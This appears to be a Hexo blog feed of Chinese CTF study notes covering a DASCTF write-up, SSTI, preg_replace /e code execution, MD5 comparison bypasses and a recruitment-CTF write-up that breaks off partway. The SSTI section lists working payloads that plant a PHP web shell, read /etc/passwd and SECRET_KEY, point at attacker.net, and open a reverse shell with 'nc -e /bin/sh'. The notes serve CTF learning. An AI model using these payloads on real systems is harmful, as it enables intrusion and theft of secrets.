operator">=</span> <span class="token string">""</span>z <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">1</span>i <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token keyword">for</span> x <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>width<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> y <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>height<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> z <span class="token operator">&lt;=</span> <span class="token number">500</span><span class="token punctuation">:</span>            z <span class="token operator">+=</span> <span class="token number">1</span>            <span class="token keyword">if</span> <span class="token builtin">pow</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span> i<span class="token punctuation">[</span>z <span class="token operator">%</span> <span class="token number">8</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">==</span> pic<span class="token punctuation">.</span>getpixel<span class="token punctuation">(</span><span class="token punctuation">(</span>x<span class="token punctuation">,</span>y<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">:</span>                flag <span class="token operator">+=</span> <span class="token string">'1'</span>            <span class="token keyword">else</span><span class="token punctuation">:</span>                flag <span class="token operator">+=</span> <span class="token string">'0'</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span>            <span class="token keyword">break</span></code></pre><p>跑出来<code>0110011001101100011000010110011101011111011010010111001100111010011001100011010100111000001100100110010100111001011000100011001100110001001110010110000101100010011001010011000101100101011001000110011001100100001101110110010001100110001101010011011000110101011001100110010101100011011001100011011001100110001101100110011000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000</code></p><p>去二进制转字符串，得到flag</p><img src="/article/dasctf2020/image-20201228203737416.png" class="" title="image-20201228203737416" loading="lazy"><hr><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>还是太菜了，有些点还是比较生疏，重点学习了一波phar反序列化，继续学习。</p>]]></content>
      
      
      <categories>
          
          <category> Write-Up </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PHP </tag>
            
            <tag> Python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SSTI模板注入</title>
      <link href="article/ssti/"/>
      <url>article/ssti/</url>
      
        <content type="html"><![CDATA[<p>SSTI模板注入</p><span id="more"></span><h1 id="SSTI漏洞"><a href="#SSTI漏洞" class="headerlink" title="SSTI漏洞"></a>SSTI漏洞</h1><h2 id="什么是模板注入"><a href="#什么是模板注入" class="headerlink" title="什么是模板注入"></a>什么是模板注入</h2><p> SSTI （服务器端模板注入）也是格式化字符串的一个非常好的例子，凡是使用模板的地方都可能会出现 SSTI 的问题，SSTI 不属于任何一种语言，沙盒绕过也不是。这种模板不仅存于Python中，PHP中也有不少模板引擎。</p><h2 id="检测流程"><a href="#检测流程" class="headerlink" title="检测流程"></a>检测流程</h2><img src="/article/ssti/SSTI%E6%B5%81%E7%A8%8B.png" class="" title="SSTI流程" loading="lazy"><p>首先输入<code>&#123;&#123;7*7&#125;&#125;</code>，返回值为<code>49</code>则表明存在SSTI</p><p>输入<code>&#123;&#123;system('cat /etc/passwd')&#125;&#125;</code>如果返回值则表明为<strong>Smarty模板引擎</strong></p><p>输入<code>&#123;&#123;7*'7'&#125;&#125;</code>如果返回值是<code>49</code>则为<strong>Twig模板引擎</strong></p><p>如果返回值是<code>7777777</code>则为<strong>JinJa模板引擎</strong></p><hr><h2 id="姿势总结"><a href="#姿势总结" class="headerlink" title="姿势总结"></a>姿势总结</h2><h3 id="Smarty"><a href="#Smarty" class="headerlink" title="Smarty"></a>Smarty</h3><p>payload：</p><pre class="language-none"><code class="language-none">&#123;self::getStreamVariable(&quot;file:&#x2F;&#x2F;&#x2F;etc&#x2F;passwd&quot;)&#125;&#123;Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,&quot;&lt;?php passthru($_GET[&#39;cmd&#39;]); ?&gt;&quot;,self::clearConfig())&#125;&#123;literal&#125;alert(&#39;xss&#39;);&#123;&#x2F;literal&#125;&#123;if readfile(&#39;&#x2F;flag&#39;)&#125;&#123;&#x2F;if&#125;</code></pre><h3 id="Twig"><a href="#Twig" class="headerlink" title="Twig"></a>Twig</h3><p>payload:</p><pre class="language-none"><code class="language-none">&#123;&#123;_self.env.setCache(&quot;ftp:&#x2F;&#x2F;attacker.net:2121&quot;)&#125;&#125;&#123;&#123;_self.env.loadTemplate(&quot;backdoor&quot;)&#125;&#125;&#123;&#123;_self.env.registerUndefinedFilterCallback(&quot;exec&quot;)&#125;&#125;&#123;&#123;_self.env.getFilter(&quot;cat &#x2F;etc&#x2F;passwd&quot;)&#125;&#125;&lt;#assign ex&#x3D;&quot;freemarker.template.utility.Execute&quot;?new()&gt; $&#123; ex(&quot;cat &#x2F;etc&#x2F;passwd&quot;) &#125;</code></pre><h3 id="Django"><a href="#Django" class="headerlink" title="Django"></a>Django</h3><p>payload:</p><pre class="language-none"><code class="language-none">&#123;user.groups.model._meta.app_config.module.admin.settings.SECRET_KEY&#125;&#123;user.user_permissions.model._meta.app_config.module.admin.settings.SECRET_KEY&#125;</code></pre><h3 id="Jinja"><a href="#Jinja" class="headerlink" title="Jinja"></a>Jinja</h3><p>payload:</p><pre class="language-none"><code class="language-none">&#123;&#123; &#39;&#39;.__class__.__mro__[2].__subclasses__()[40](&#39;&#x2F;tmp&#x2F;evil&#39;, &#39;w&#39;).write(&#39;from os import system%0aSHELL &#x3D; system&#39;) &#125;&#125;&#x2F;&#x2F;写文件&#123;&#123; config.from_pyfile(&#39;&#x2F;tmp&#x2F;evil&#39;) &#125;&#125;&#x2F;&#x2F;加载system&#123;&#123; config[&#39;SHELL&#39;](&#39;nc xxxx xx -e &#x2F;bin&#x2F;sh&#39;) &#125;&#125;&#x2F;&#x2F;执行命令反弹SHELL</code></pre><h3 id="Tornado"><a href="#Tornado" class="headerlink" title="Tornado"></a>Tornado</h3><p>payload:</p><pre class="language-none"><code class="language-none">http:&#x2F;&#x2F;ip:port&#x2F;error?msg&#x3D;&#123;&#123;handler.settings&#125;&#125;</code></pre>]]></content>
      
      
      <categories>
          
          <category> 杂谈笔记 </category>
          
          <category> 学习笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SSTI </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>preg_replace与代码执行</title>
      <link href="article/preg_replace/"/>
      <url>article/preg_replace/</url>
      
        <content type="html"><![CDATA[<p>参考文章链接： <a href="https://xz.aliyun.com/t/2557">https://xz.aliyun.com/t/2557</a> </p><span id="more"></span><h1 id="preg-replace与代码执行"><a href="#preg-replace与代码执行" class="headerlink" title="preg_replace与代码执行"></a>preg_replace与代码执行</h1><p> <strong>preg_replace</strong> <strong>&#x2F;e</strong> 模式下的代码执行问题 </p><pre class="language-php" data-language="php"><code class="language-php"><span class="token keyword">function</span> <span class="token function-definition function">complex</span><span class="token punctuation">(</span><span class="token variable">$re</span><span class="token punctuation">,</span> <span class="token variable">$str</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">return</span> <span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/('</span> <span class="token operator">.</span> <span class="token variable">$re</span> <span class="token operator">.</span> <span class="token string single-quoted-string">')/ei'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'strtolower("\\1")'</span><span class="token punctuation">,</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">foreach</span><span class="token punctuation">(</span><span class="token variable">$_GET</span> <span class="token keyword">as</span> <span class="token variable">$re</span> <span class="token operator">=></span> <span class="token variable">$str</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">echo</span> <span class="token function">complex</span><span class="token punctuation">(</span><span class="token variable">$re</span><span class="token punctuation">,</span> <span class="token variable">$str</span><span class="token punctuation">)</span><span class="token operator">.</span> <span class="token string double-quoted-string">"\n"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><p> <strong>preg_replace</strong> 使用了 <strong>&#x2F;e</strong> 模式，导致可以代码执行，而且该函数的第一个和第三个参数都是我们可以控制的。 </p><p> <strong>preg_replace</strong> 函数在匹配到符号正则的字符串时，会将替换字符串（也就是上图 <strong>preg_replace</strong> 函数的第二个参数）当做代码来执行，然而这里的第二个参数却固定为 <strong>‘strtolower(“\1”)’</strong> 字符串.</p><p>上面的命令执行，相当于 <strong>eval(‘strtolower(“\1”);’)</strong> 结果，当中的 <strong>\1</strong> 实际上就是 <strong>\1</strong> ，而 <strong>\1</strong> 在正则表达式中有自己的含义。</p><blockquote><p><strong>反向引用</strong></p><p>对一个正则表达式模式或部分模式 <strong>两边添加圆括号</strong> 将导致相关 <strong>匹配存储到一个临时缓冲区</strong> 中，所捕获的每个子匹配都按照在正则表达式模式中从左到右出现的顺序存储。缓冲区编号从 1 开始，最多可存储 99 个捕获的子表达式。每个缓冲区都可以使用 ‘\n’ 访问，其中 n 为一个标识特定缓冲区的一位或两位十进制数。</p></blockquote><p> <strong>payload</strong> 为： <strong>&#x2F;?.*&#x3D;{${phpinfo()}}</strong> ，即 <strong>GET</strong> 方式传入的参数名为 <strong>&#x2F;?.*</strong> ，值为 <strong>{${phpinfo()}}</strong> 。 </p><pre class="language-none"><code class="language-none">$re&#x3D;.*$str&#x3D;&#123;$&#123;phpinfo()&#125;&#125;原先的语句： preg_replace(&#39;&#x2F;(&#39; . $re . &#39;)&#x2F;ei&#39;, &#39;strtolower(&quot;\\1&quot;)&#39;, $str);变成了语句： preg_replace(&#39;&#x2F;(.*)&#x2F;ei&#39;, &#39;strtolower(&quot;\\1&quot;)&#39;, &#123;$&#123;phpinfo()&#125;&#125;);</code></pre><hr><p> 由于在PHP中，对于传入的非法的 <strong>$_GET</strong> 数组参数名，会将其转换成下划线，这就导致我们正则匹配失效。 </p><p> 当非法字符为首字母时，只有点号会被替换成下划线，所以我们要做的就是换一个正则表达式，让其匹配到 <strong>{${phpinfo()}}</strong> 即可执行 <strong>phpinfo</strong> 函数。<strong>payload</strong> ： <strong>\S*&#x3D;${phpinfo()}</strong> </p><p> 为什么要匹配到 <strong>{${phpinfo()}}</strong> 或者 <strong>${phpinfo()}</strong> ，才能执行 <strong>phpinfo</strong> 函数，这是一个小坑。这实际上是 <a href="http://php.net/manual/zh/language.variables.variable.php">PHP可变变量</a> 的原因。在PHP中双引号包裹的字符串中可以解析变量，而单引号则不行。 <strong>${phpinfo()}</strong> 中的 <strong>phpinfo()</strong> 会被当做变量先执行，执行后，即变成 <strong>${1}</strong> (phpinfo()成功执行返回true)。 </p><p>文章链接： <a href="https://xz.aliyun.com/t/2557">https://xz.aliyun.com/t/2557</a> </p>]]></content>
      
      
      <categories>
          
          <category> 杂谈笔记 </category>
          
          <category> 学习笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PHP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>md5比较</title>
      <link href="article/md5/"/>
      <url>article/md5/</url>
      
        <content type="html"><![CDATA[<p>MD5弱类型比较，强类型比较以及真实碰撞</p><span id="more"></span><h1 id="MD5比较类型"><a href="#MD5比较类型" class="headerlink" title="MD5比较类型"></a>MD5比较类型</h1><h2 id="弱类型比较"><a href="#弱类型比较" class="headerlink" title="弱类型比较"></a>弱类型比较</h2><pre class="language-php" data-language="php"><code class="language-php"><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'a'</span><span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'b'</span><span class="token punctuation">]</span> <span class="token operator">&amp;&amp;</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'a'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'b'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre><p>弱类型比较因为php特性，0e开头会被识别为科学计数法，结果0&#x3D;0比较成功</p><p>payload：</p><pre class="language-php" data-language="php"><code class="language-php">a<span class="token operator">=</span><span class="token constant">QNKCDZO</span><span class="token operator">&amp;</span>b<span class="token operator">=</span>aabg7XSs</code></pre><p>只要是md5值为0e开头即可</p><hr><h2 id="强比较类型"><a href="#强比较类型" class="headerlink" title="强比较类型"></a>强比较类型</h2><pre class="language-php" data-language="php"><code class="language-php"><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'a'</span><span class="token punctuation">]</span> <span class="token operator">!==</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'b'</span><span class="token punctuation">]</span> <span class="token operator">&amp;&amp;</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'a'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'b'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre><p>强类型比较用数组绕过，md5()函数无法解出其数值，就会得到&#x3D;&#x3D;&#x3D;强比较值相等</p><p>payload：</p><pre class="language-php" data-language="php"><code class="language-php">a<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">111</span><span class="token operator">&amp;</span>b<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">=</span>aaa</code></pre><p>传入数组即可</p><hr><h2 id="真实碰撞"><a href="#真实碰撞" class="headerlink" title="真实碰撞"></a>真实碰撞</h2><pre class="language-php" data-language="php"><code class="language-php"><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword type-casting">string</span><span class="token punctuation">)</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'a'</span><span class="token punctuation">]</span> <span class="token operator">!==</span> <span class="token punctuation">(</span><span class="token keyword type-casting">string</span><span class="token punctuation">)</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'b'</span><span class="token punctuation">]</span> <span class="token operator">&amp;&amp;</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'a'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'b'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre><p>真实md5碰撞，由于string()函数，不能输入数组只能输入字符串</p><p>payload：</p><pre class="language-php" data-language="php"><code class="language-php">a<span class="token operator">=</span><span class="token operator">%</span><span class="token number">4</span>d<span class="token operator">%</span>c9<span class="token operator">%</span><span class="token number">68</span><span class="token operator">%</span>ff<span class="token operator">%</span><span class="token number">0</span>e<span class="token operator">%</span>e3<span class="token operator">%</span><span class="token number">5</span>c<span class="token operator">%</span><span class="token number">20</span><span class="token operator">%</span><span class="token number">95</span><span class="token operator">%</span><span class="token number">72</span><span class="token operator">%</span>d4<span class="token operator">%</span><span class="token number">77</span><span class="token operator">%</span><span class="token number">7</span>b<span class="token operator">%</span><span class="token number">72</span><span class="token operator">%</span><span class="token number">15</span><span class="token operator">%</span><span class="token number">87</span><span class="token operator">%</span>d3<span class="token operator">%</span><span class="token number">6</span>f<span class="token operator">%</span>a7<span class="token operator">%</span>b2<span class="token operator">%</span><span class="token number">1</span>b<span class="token operator">%</span>dc<span class="token operator">%</span><span class="token number">56</span><span class="token operator">%</span>b7<span class="token operator">%</span><span class="token number">4</span>a<span class="token operator">%</span><span class="token number">3</span>d<span class="token operator">%</span>c0<span class="token operator">%</span><span class="token number">78</span><span class="token operator">%</span><span class="token number">3</span>e<span class="token operator">%</span><span class="token number">7</span>b<span class="token operator">%</span><span class="token number">95</span><span class="token operator">%</span><span class="token number">18</span><span class="token operator">%</span>af<span class="token operator">%</span>bf<span class="token operator">%</span>a2<span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span>a8<span class="token operator">%</span><span class="token number">28</span><span class="token operator">%</span><span class="token number">4</span>b<span class="token operator">%</span>f3<span class="token operator">%</span><span class="token number">6</span>e<span class="token operator">%</span><span class="token number">8</span>e<span class="token operator">%</span><span class="token number">4</span>b<span class="token operator">%</span><span class="token number">55</span><span class="token operator">%</span>b3<span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">42</span><span class="token operator">%</span><span class="token number">75</span><span class="token operator">%</span><span class="token number">93</span><span class="token operator">%</span>d8<span class="token operator">%</span><span class="token number">49</span><span class="token operator">%</span><span class="token number">67</span><span class="token operator">%</span><span class="token number">6</span>d<span class="token operator">%</span>a0<span class="token operator">%</span>d1<span class="token operator">%</span><span class="token number">55</span><span class="token operator">%</span><span class="token number">5</span>d<span class="token operator">%</span><span class="token number">83</span><span class="token operator">%</span><span class="token number">60</span><span class="token operator">%</span>fb<span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">07</span><span class="token operator">%</span>fe<span class="token operator">%</span>a2<span class="token operator">&amp;</span>b<span class="token operator">=</span><span class="token operator">%</span><span class="token number">4</span>d<span class="token operator">%</span>c9<span class="token operator">%</span><span class="token number">68</span><span class="token operator">%</span>ff<span class="token operator">%</span><span class="token number">0</span>e<span class="token operator">%</span>e3<span class="token operator">%</span><span class="token number">5</span>c<span class="token operator">%</span><span class="token number">20</span><span class="token operator">%</span><span class="token number">95</span><span class="token operator">%</span><span class="token number">72</span><span class="token operator">%</span>d4<span class="token operator">%</span><span class="token number">77</span><span class="token operator">%</span><span class="token number">7</span>b<span class="token operator">%</span><span class="token number">72</span><span class="token operator">%</span><span class="token number">15</span><span class="token operator">%</span><span class="token number">87</span><span class="token operator">%</span>d3<span class="token operator">%</span><span class="token number">6</span>f<span class="token operator">%</span>a7<span class="token operator">%</span>b2<span class="token operator">%</span><span class="token number">1</span>b<span class="token operator">%</span>dc<span class="token operator">%</span><span class="token number">56</span><span class="token operator">%</span>b7<span class="token operator">%</span><span class="token number">4</span>a<span class="token operator">%</span><span class="token number">3</span>d<span class="token operator">%</span>c0<span class="token operator">%</span><span class="token number">78</span><span class="token operator">%</span><span class="token number">3</span>e<span class="token operator">%</span><span class="token number">7</span>b<span class="token operator">%</span><span class="token number">95</span><span class="token operator">%</span><span class="token number">18</span><span class="token operator">%</span>af<span class="token operator">%</span>bf<span class="token operator">%</span>a2<span class="token operator">%</span><span class="token number">02</span><span class="token operator">%</span>a8<span class="token operator">%</span><span class="token number">28</span><span class="token operator">%</span><span class="token number">4</span>b<span class="token operator">%</span>f3<span class="token operator">%</span><span class="token number">6</span>e<span class="token operator">%</span><span class="token number">8</span>e<span class="token operator">%</span><span class="token number">4</span>b<span class="token operator">%</span><span class="token number">55</span><span class="token operator">%</span>b3<span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">42</span><span class="token operator">%</span><span class="token number">75</span><span class="token operator">%</span><span class="token number">93</span><span class="token operator">%</span>d8<span class="token operator">%</span><span class="token number">49</span><span class="token operator">%</span><span class="token number">67</span><span class="token operator">%</span><span class="token number">6</span>d<span class="token operator">%</span>a0<span class="token operator">%</span>d1<span class="token operator">%</span>d5<span class="token operator">%</span><span class="token number">5</span>d<span class="token operator">%</span><span class="token number">83</span><span class="token operator">%</span><span class="token number">60</span><span class="token operator">%</span>fb<span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">07</span><span class="token operator">%</span>fe<span class="token operator">%</span>a2</code></pre><p>值不等，md5相等即可。md5碰撞。</p><hr><h2 id="0e开头MD5的MD5为0e的MD5"><a href="#0e开头MD5的MD5为0e的MD5" class="headerlink" title="0e开头MD5的MD5为0e的MD5"></a>0e开头MD5的MD5为0e的MD5</h2><p>0e215962017 </p>]]></content>
      
      
      <categories>
          
          <category> 杂谈笔记 </category>
          
          <category> 学习笔记 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>S3cCTF-出题人gyy-Writeup</title>
      <link href="article/S3cCTF-gyy-Writeup/"/>
      <url>article/S3cCTF-gyy-Writeup/</url>
      
        <content type="html"><![CDATA[<h1 id="S3cCTF-gyy-Writeup"><a href="#S3cCTF-gyy-Writeup" class="headerlink" title="S3cCTF-gyy-Writeup"></a>S3cCTF-gyy-Writeup</h1><p><strong>出题人：gyy</strong></p><p><strong>写在前面：</strong></p><p>本次招新赛我主要负责WEB方面的出题，当然兼顾一些MISC，本着简单易懂的原则，刚开始出了很多简单WEB题，但是这届新生的实力明显比我们当时强&#x3D; &#x3D;，后期又赶了一些提升题，当然和真正的CTF比赛还是有非常大的距离，例如在群里放出的周六的题目可以看出。所以，这些只是入门CTF的基础，去年的这时，我们参加的招新比赛比今年更加困难（所以今年我有同感地出了不少简单题），我希望大家不要止步于此，当初我也有一腔热血，觉得CTF不过如此（甚至还想双修）。但，走的越高，越会发现自己越渺小，这条道路可能还没有尽头。技术可以后期培养，这次招新比赛分数也只能作为检测基础的测试，如果你有强烈的意向和兴趣，比比赛成绩更为重要，我们欢迎你和我们联系，希望大家不忘初心，砥砺前行。</p><h1 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h1><h2 id="How-to-solve-ctf"><a href="#How-to-solve-ctf" class="headerlink" title="How_to_solve_ctf"></a>How_to_solve_ctf</h2><h3 id="出题解析"><a href="#出题解析" class="headerlink" title="出题解析"></a>出题解析</h3><p>本题旨在指引大家，考了一下HTML的知识</p><h3 id="解题方式"><a href="#解题方式" class="headerlink" title="解题方式"></a>解题方式</h3><p>F12查看源代码，给了提示<code>&lt;!-- html元素是可以修改的 --&gt;</code><br>修改form表单里input文本框的长度限制，提交s3c2020即可获得flag<br>由于是GET传参，也可以直接传<code>key=s3c2020</code>即可</p><img src="/article/S3cCTF-gyy-Writeup/20201122173122547.png" class="" title="web1" loading="lazy"><hr><h2 id="nof12"><a href="#nof12" class="headerlink" title="nof12"></a>nof12</h2><h3 id="出题解析-1"><a href="#出题解析-1" class="headerlink" title="出题解析"></a>出题解析</h3><p>本题利用script限制了鼠标右键和f12</p><h3 id="解题方式-1"><a href="#解题方式-1" class="headerlink" title="解题方式"></a>解题方式</h3><p>与题目 <strong>S3C_NOT_BAD</strong> 重复，Ctrl+U或者burp抓包或者curl访问都可</p><img src="/article/S3cCTF-gyy-Writeup/20201122174018834.png" class="" title="web2" loading="lazy"><hr><h2 id="Local"><a href="#Local" class="headerlink" title="Local"></a>Local</h2><h3 id="出题解析-2"><a href="#出题解析-2" class="headerlink" title="出题解析"></a>出题解析</h3><p>本题旨在考XFF（X-Forwarded-For）和Referer<br>伪造地址三种方式：</p><pre class="language-none"><code class="language-none">Client-Ip: 127.0.0.1X-Forwarded-For: 127.0.0.1Host: 127.0.0.1Referer: 127.0.0.1</code></pre><h3 id="解题方式-2"><a href="#解题方式-2" class="headerlink" title="解题方式"></a>解题方式</h3><p>只有本地管理员才能访问本页面！<br>burp抓包修改即可</p><img src="/article/S3cCTF-gyy-Writeup/20201122174702383.png" class="" title="web3" loading="lazy"><hr><h2 id="Flag-not-found"><a href="#Flag-not-found" class="headerlink" title="Flag not found"></a>Flag not found</h2><h3 id="出题解析-3"><a href="#出题解析-3" class="headerlink" title="出题解析"></a>出题解析</h3><p>302重定向</p><pre class="language-php" data-language="php"><code class="language-php">//flag.php<span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token function">header</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'Flag: '</span><span class="token operator">.</span><span class="token function">base64_encode</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"s3c&#123;0H_mY_g0d_its_4O4&#125;"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//修改 X-Powered-By信息</span><span class="token function">header</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'location:404.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span></code></pre><pre class="language-php" data-language="php"><code class="language-php">//404.php<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h1</span><span class="token punctuation">></span></span>Not Found<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h1</span><span class="token punctuation">></span></span><span class="token comment">&lt;!-- 才怪 --></span><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> @<span class="token function">header</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"http/1.1 404 not found"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> @<span class="token function">header</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"status: 404 not found"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;p>The requested URL /flag.php was not found on this server.&lt;/p>"</span><span class="token punctuation">;</span><span class="token keyword">exit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token delimiter important">?></span></span></code></pre><h3 id="解题方式-3"><a href="#解题方式-3" class="headerlink" title="解题方式"></a>解题方式</h3><p>打开点击后跳转Not Found，仔细看发现界面是伪造的</p><img src="/article/S3cCTF-gyy-Writeup/20201122175207502.png" class="" width="404" loading="lazy"><p>因为界面是我自己写的假界面，特意写了个注释，由此想到重定向<br>直接在header里能看到flag</p><img src="/article/S3cCTF-gyy-Writeup/20201122175439466.png" class="" title="flag" loading="lazy"><p>拿去base64解一下即可获得flag</p><img src="/article/S3cCTF-gyy-Writeup/20201122175814189.png" class="" title="base64" loading="lazy"><hr><h2 id="快速计算"><a href="#快速计算" class="headerlink" title="快速计算"></a>快速计算</h2><h3 id="出题解析-4"><a href="#出题解析-4" class="headerlink" title="出题解析"></a>出题解析</h3><p>本题考查PHP和Python脚本，3秒内…有人能做得到嘛？</p><p>本题网上找一个脚本改改完全没问题，其实还有一题计算字符串（原创题目前网上没有脚本），师傅们说不放就没放啦，有兴趣可以做做 <a href="http://49.234.89.193:8088/">题目链接</a>(链接可能会挂，题目随时可能哪天我就关了…)</p><h3 id="解题方式-4"><a href="#解题方式-4" class="headerlink" title="解题方式"></a>解题方式</h3><p>请在3秒内计算以下算式并提交并提交<br>在服务器设的SESSION，3秒刷新，超时也是不算的<br>设了个小坑，抓个包可以看到，每次提交的请求还有个参数<code>submits=提交</code></p><img src="/article/S3cCTF-gyy-Writeup/20201122180918644.png" class="" title="参数" loading="lazy"><p>如果没有就会die退出</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'submits'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"少了点东西啊...好好看看吧"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>最后放出Payload，师傅们可以自己研究</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token comment"># -*- coding: utf-8 -*-</span><span class="token triple-quoted-string string">"""@Time ： 2020/11/22 18:14@Auth ： gyy@File ：1.py@Blog：http://err0r.top"""</span><span class="token keyword">import</span> requestsurl <span class="token operator">=</span> <span class="token string">"http://49.234.89.193:8029/"</span>session <span class="token operator">=</span> requests<span class="token punctuation">.</span>session<span class="token punctuation">(</span><span class="token punctuation">)</span>data <span class="token operator">=</span> <span class="token punctuation">&#123;</span>    <span class="token string">"submits"</span> <span class="token punctuation">:</span> <span class="token string">"提交"</span><span class="token punctuation">&#125;</span>response <span class="token operator">=</span> session<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">)</span><span class="token punctuation">.</span>content<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"1--------------------取算式"</span><span class="token punctuation">)</span>cal <span class="token operator">=</span> response<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">" "</span> <span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"\n"</span> <span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"\r"</span> <span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token 